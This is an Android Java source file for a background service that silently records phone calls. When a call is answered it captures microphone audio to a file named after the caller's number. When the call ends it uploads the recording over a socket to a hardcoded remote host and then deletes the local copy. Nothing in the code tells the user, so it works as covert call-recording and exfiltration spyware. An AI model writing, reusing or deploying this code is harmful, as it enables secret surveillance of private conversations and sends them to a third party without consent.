package cn.why.listener;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import cn.why.utils.StreamTool;

public class PhoneService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	@Override
	public void onCreate() {
		super.onCreate();
		//监听电话
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}
	
	private final class PhoneListener extends PhoneStateListener{
		private String incomingNumber;
		private MediaRecorder mediaRecorder;
		private File file;
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
					case TelephonyManager.CALL_STATE_RINGING://来电状态
						this.incomingNumber = incomingNumber;
						break;
					case TelephonyManager.CALL_STATE_OFFHOOK://接听状态
						System.out.println("电话正在接听");
						file = new File(Environment.getExternalStorageDirectory(), incomingNumber+System.currentTimeMillis()+ ".3gp");
						mediaRecorder = new MediaRecorder();
						mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
						mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
						mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
						mediaRecorder.setOutputFile(file.getAbsolutePath());
						mediaRecorder.prepare();
						mediaRecorder.start();//开始录音
						break;
					case TelephonyManager.CALL_STATE_IDLE://挂断电话后回归到空闲状态
						if(mediaRecorder != null){
							mediaRecorder.stop();
							mediaRecorder.release();
							mediaRecorder = null;
							uploadFile();
						}
						break;
				}
			} catch (IllegalStateException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	private void uploadFile() {
		new Thread(new Runnable() {				
			public void run() {
				try {
					if(file!=null && file.exists()){
						Socket socket = new Socket("169.254.68.73", 7878);
			            OutputStream outStream = socket.getOutputStream();
			            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
			            outStream.write(head.getBytes());
			            
			            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
						String response = StreamTool.readLine(inStream);
			            String[] items = response.split(";");
						String position = items[1].substring(items[1].indexOf("=")+1);
						
						RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
						fileOutStream.seek(Integer.valueOf(position));
						byte[] buffer = new byte[1024];
						int len = -1;
						while( (len = fileOutStream.read(buffer)) != -1){
							outStream.write(buffer, 0, len);
						}
						fileOutStream.close();
						outStream.close();
			            inStream.close();
			            socket.close();
			            file.delete();
			            file = null;
		            }
		        } catch (Exception e) {                    
		            e.printStackTrace();
		        }
			}
		}).start();
	}		
}
}